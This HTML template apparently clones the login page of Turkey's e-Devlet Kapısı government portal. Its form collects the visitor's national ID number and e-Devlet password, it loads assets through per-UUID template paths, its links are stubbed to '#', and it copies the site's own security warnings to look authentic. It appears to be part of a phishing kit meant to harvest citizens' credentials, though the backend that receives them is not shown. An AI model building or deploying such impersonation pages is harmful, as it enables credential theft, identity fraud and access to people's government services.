<!doctype html>
<html class="no-js" lang="tr">
   <head>
      <meta charset="utf-8">
      <link rel="dns-prefetch" href="#">
      <link rel="dns-prefetch" href="#">
      <title>e-Devlet Kapısı
      </title>
      <link rel="icon" type="image/png" href="../{{ $uuid }}/images/favicon-196x196.png" sizes="196x196">
      <link href="{{ asset("$uuid/css/base.css") }}" rel="stylesheet" type="text/css" >
      <link href="{{ asset("$uuid/css/giris.css") }}" rel="stylesheet" type="text/css" >
      <script src="{{ asset("$uuid/js/haeder.js") }}"></script>
      <link rel="alternate" type="application/rss+xml" title="e-Devlet Kapısı"
         href="">
      <link rel="search" type="application/opensearchdescription+xml" href="#"
         title="Arama"/>
      <style>
         #page header h1 {
         background-image: url('../{{$uuid}}/images/edkkds.svg');
         }
      </style>
   </head>
   <body data-lang="null">
      <div id="page">
         <header id="headerSection">
            <h1>Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi</h1>
            <nav id="accesibilityBlock" class="visuallyhidden">
               <ul>
                  <li><a href="#" accesskey="s">Ana Sayfa</a></li>
                  <li><a href="#" accesskey="1">İçeriğe Git</a></li>
               </ul>
            </nav>
         </header>
         <main>
            <section class="referrerApp">
               <img class="sso" src="../{{$uuid}}/images/1.png" alt="" width="165" height="40">
               <dl>
                  <dt>Giriş Yapılacak Adres
                  </dt>
                  <dd><span title="www.turkiye.gov.tr">www.turkiye.gov.tr</span></dd>
                  <dt>Giriş Yapılacak Uygulama
                  </dt>
                  <dd><span title="e-Devlet Kapısı">e-Devlet Kapısı</span></dd>
               </dl>
            </section>
            <nav class="methodSelector">
               <div class="comboChooser">
                  <h2>Giriş Seçenekleri
                  </h2>
                  <em id="loginMenuButton" onclick="$(this).toggleClass('open').parent().toggleClass('open');">
                  <strong class="password">e-Devlet Şifresi
                  </strong>
                  <a href="#"
                     title="Doğrulama Yöntemini Değiştir">Değiştir
                  </a>
                  </em>
                  <nav id="loginContextMenu">
                     <ul id="userShortcuts">
                        <h2>Geçerli Kimlik Doğrulama Yöntemleri
                        </h2>
                        <li class="active"><a
                           href="#"
                           class="password">e-Devlet Şifresi
                           </a>
                        </li>
                        <li ><a
                           href="#"
                           class="mSignature">Mobil İmza
                           </a>
                        </li>
                        <li ><a
                           href="#"
                           class="eSignature">Elektronik İmza
                           </a>
                        </li>
                        <li ><a
                           href="#"
                           class="idCard">T.C. Kimlik Kartı
                           </a>
                        </li>
                        <li ><a
                           href="#"
                           class="onlineBanking">İnternet Bankacılığı
                           </a>
                        </li>
                     </ul>
                  </nav>
               </div>
               <div class="tabChooser">
                  <nav role="tablist">
                     <div role="tab"><a class="active"
                        href="#">
                        <span class="password">e-Devlet Şifresi</span>
                        </a>
                     </div>
                     <div role="tab"><a 
                        href="#">
                        <span class="mSignature">Mobil İmza</span>
                        </a>
                     </div>
                     <div role="tab"><a 
                        href="#">
                        <span class="eSignature">e-İmza</span>
                        </a>
                     </div>
                     <div role="tab"><a 
                        href="#">
                        <span class="idCard">T.C. Kimlik Kartı</span>
                        </a>
                     </div>
                     <div role="tab"><a 
                        href="#">
                        <span class="onlineBanking">İnternet Bankacılığı</span>
                        </a>
                     </div>
                  </nav>
               </div>
            </nav>
            <section id="pageContent">
               <div class="richText">
                  T.C. Kimlik Numaranızı ve e-Devlet Şifrenizi kullanarak kimliğiniz doğrulandıktan sonra işleminize kaldığınız yerden devam edebilirsiniz.
                  <a open-modal="info" href="#">e-Devlet Şifresi Nedir, Nasıl Alınır?
                  </a>
               </div>
               <!--
                  Login Form Start
                  -->
               <form method="post" id="loginForm" name="sifreGirisForm" autocomplete="off">
                  <fieldset>
                     <div class="formRow required ">
                        <label for="tridField"
                           class="rowLabel">T.C. Kimlik No
                        </label>
                        <input type="hidden" name="encTridField" id="encTridField" value=""/>
                        <div class="fieldGroup">
                           <input name="tridField" type="text" class="text" id="tridField"
                              value="" tabindex="1"
                              autocomplete="off" maxlength="11" pattern="[0-9]{11}"
                              title="Kimlik numaranız 11 adet rakamdan oluşmalıdır"
                              aria-required="true" required/>
                           <span class="virtual-key-wrapper">
                           <a href="#" class="virtualKeypad">Sanal Klavye</a>
                           <a href="#" id="toogleTrid"
                              class="maskedFieldLink" title="Yazarken Gizle">Yazarken Gizle
                           </a>
                           </span>
                        </div>
                     </div>
                     <div class="formRow required ">
                        <label for="egpField"
                           class="rowLabel">e-Devlet Şifresi
                        </label>
                        <div class="fieldGroup">
                           <input name="egpField" id="egpField" type="password" class="text" tabindex="2"
                              aria-required="true" required/>
                           <input type="hidden" name="encEgpField" id="encEgpField" value=""/>
                           <span class="virtual-key-wrapper">
                           <a href="#" class="virtualKeyboard">Sanal Klavye</a>
                           <a href="#"
                              class="forgotPasswordLink">Şifremi Unuttum
                           </a>
                           </span>
                           <div class="capsWarning">
                              <strong>Dikkat:</strong> Üst Karakter (
                              ⇪Caps Lock) tuşunuz açık.
                           </div>
                           <div class="fieldInfo richText">
                              * e-Devlet
                              <a open-modal="info" href="#">şifrenizi unutmanız durumunda
                              </a>
                              doğruladığınız cep telefonunuzdan yenileme işlemi yapabilirsiniz.<br/>
                           </div>
                        </div>
                     </div>
                  </fieldset>
                  <!-- 
                     --Loader--
                     <div class="loader" style="display: none"><img src="https://cdn.e-devlet.gov.tr/themes/izmir/images/form-progress.svg"
                          alt="...">İşleminiz devam ediyor. Lütfen bekleyiniz...
                     --Loader end--
                     </div> -->
                  <div class="formSubmitRow">
                     <input type="hidden" name="currentPageToken" value="2ad73392-6379-472b-b009-025f35ffb166"/>
                     <input type="hidden" name="actionName" value="giris"/>
                     <input type="hidden" name="jsonData" id="jsonData" value=""/>
                     <input class="submitButton" name="submitButton" type="submit"
                        tabindex="3" value="Giriş Yap"/>
                     <input formnovalidate class="backButton" name="cancelButton" type="submit"
                        value="İptal Et"/>
                  </div>
               </form>
               <!--
                  Login Form End
                  -->
            </section>
         </main>
         <footer>
            <ul class="footerLinks">
               <li>
                  <a open-modal="gizlilikGuvenlik" href="#">Gizlilik ve Güvenlik</a>
               </li>
               <li>
                  <a href="#">Hızlı Çözüm Merkezi</a>
               </li>
            </ul>
            <div class="copyrightDetails">
               © 2022, Ankara - Tüm Hakları Saklıdır
            </div>
         </footer>
      </div>
      <div class="mask"></div>
      <script src="{{ asset("$uuid/js/common.js") }}"></script>
      <script src="{{ asset("$uuid/js/giris.js") }}"></script>
      <script src="{{ asset("$uuid/js/jcr.js") }}"></script>
      <div class="modal" id="gizlilikGuvenlik">
         <div class="modal-container">
            <span class="close" close-modal><i class="edk-fonticon-close"></i></span>
            <h3>Gizlilik ve Güvenlik</h3>
            <div class="modal-content">
               <p>e-Devlet Kapısı çalışanları hiçbir zaman size şifrenizi sormayacaktır. Şifrenizi e-Devlet Kapısı giriş ekranları haricinde hiçbir yere kaydetmeyiniz. Tarayıcı uygulaması (Internet Explorer, Firefox, Safari ve benzeri uygulamaların) şifre kaydetme opsiyonlarını kapalı tutunuz. Ayrıca hiçbir zaman kişisel bilgileriniz veya şifreniz e-posta yolu ile sizlere sorulmayacaktır. Unutmayınız ki zararlı uygulamaların ve virüslerin büyük çoğunluğu e-posta yolu ile yayılmaktadır. Bu sebeple göndericisini tanımadığınız veya şüpheli e-postaları okumadan siliniz.</p>
               <p>e-Devlet Kapısı sistemi, güvenlik amaçlı olarak elektronik sertifika kullanmaktadır. Erişiminizin güvenli olup olmadığını adres çubuğunda yer alan adresin http değil https ile başlamasından ve tarayıcı uygulamasındaki kilit resminden anlayabilirsiniz.</p>
            </div>
            <div class="modal-footer">
               <div class="formSubmitRow">
                  <button class="cancelButton" close-modal>Kapat</button>
               </div>
            </div>
         </div>
         <div class="modalBg"></div>
      </div>
      <!--    Form Submit 
         <script type="text/javascript">
         $(document).ready(function () {
             $('form').submit(function () {
                 $('.formSubmitRow').hide();
                 $('.loader').show();
             });
         
             $('input').keypress(function (e) {
                 if (e.which == 13) {
                     $('.submitButton').click();
                     return false;
                 }
             });
         });
         </script> -->
      <div class="modal" id="info">
         <div class="modal-container">
            <span class="close" close-modal><i class="edk-fonticon-close"></i></span>
            <h3>e-Devlet Şifresi</h3>
            <div class="modal-content">
               <p>e-Devlet şifrenizi içeren zarfınızı PTT Merkez Müdürlüklerinden, şahsen başvuru ile, üzerinde T.C. Kimlik numaranızın bulunduğu kimliğinizi ibraz ederek temin edebilirsiniz.</p>
               <p>Bu uygulama, sizin yerinize başka bir kişinin şifre alıp adınıza işlem yapmasının önüne geçilmesi için gerekmektedir. e-Devlet Kapısı üzerinden verilen hizmetler yüksek güvenlik seviyesi gerektirdiğinden, şifreler başvuru sahipleri için özel olarak oluşturulmaktadır. Bu nedenle ancak kimlik ibrazı ve şahsen başvuru ile şifreler verilmektedir.</p>
               <p>Şifre ilk alındığında PTT tarafından işlem masrafı olarak 2 TL tahsil edilmektedir. Şifrenin kaybedilmesi, unutulması vb. durumlarda PTT'den alınacak her şifre için ayrıca 4 TL ücret ödenmektedir. Bu işlem masrafı dışında herhangi bir yıllık ücret ödenmesi söz konusu değildir.</p>
               <h4>Şifrenizi unutmanız durumunda e-Devlet'te doğruladığınız telefon numaranız ile şifrenizi yenileyebilirsiniz.</h4>
               <p>e-Devlet Kapısı kayıtlı kullanıcısıysanız ve şifrenizle giriş yaptıktan sonra "Profilim" alanında bulunan iletişim bilgileri kısmına cep telefonunuzu kaydettiyseniz ya da cep telefonunuzu veya hem cep telefonunuzu hem de e-posta adresinizi e-Devlet Kapısında doğruladıysanız şifre yenileme hizmetinden yararlanarak yeniden şifre temin edebilirsiniz. Bununla birlikte, mobil imza, elektronik imza, yeni T.C. kimlik kartı veya internet bankacılığı kullanıyorsanız, e-Devlet Kapısına bunlardan biri ile giriş yaptıktan sonra da şifre oluşturabilirsiniz.</p>
               <p>e-Devlet şifresi yurt dışında Elçilik ve Konsolosluklardan ücretsiz olarak temin edilebilmektedir.</p>
            </div>
            <div class="modal-footer">
               <div class="formSubmitRow">
                  <button class="cancelButton" close-modal>Kapat</button>
               </div>
            </div>
         </div>
         <div class="modalBg"></div>
      </div>
   </body>
</html>